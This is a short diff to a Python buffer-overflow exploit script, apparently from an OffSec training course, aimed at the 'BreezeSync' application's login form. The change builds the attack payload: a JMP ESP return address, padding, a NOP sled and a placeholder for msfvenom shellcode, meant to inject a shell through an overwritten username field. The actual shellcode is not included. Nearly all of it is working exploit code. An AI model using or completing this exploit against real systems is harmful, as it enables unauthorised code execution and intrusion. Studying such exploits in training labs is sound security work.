@@ -1,5 +1,5 @@
 #!/usr/bin/python
-# Buff overflow script to replicate, previous application crash
+# Buff overflow script to replicate BreezeSync buffer overflow and inject a shell into the resulting memory overwrite
 # Devleoped by OffSec
 
 import socket
@@ -11,9 +11,9 @@ try:
   eip = "\x83\x0c\x09\x10" #address of JMP ESP here
   offset = "C" * 4
   shellcode = "msfVenom payload SGN encoded here"
-  buffer = shellCode * (1500 - len(filler) - len(eip) - 
-len(offset))
-  inputBuffer = filler + eip + offset + buffer
+  nops = "\x90" * 10 # nop slide to protect decoding corruption of ESP
+ 
+  inputBuffer = filler + eip + offset + nops + shellcode
   
   content = "username=" + inputBuffer + "&password=A"
 
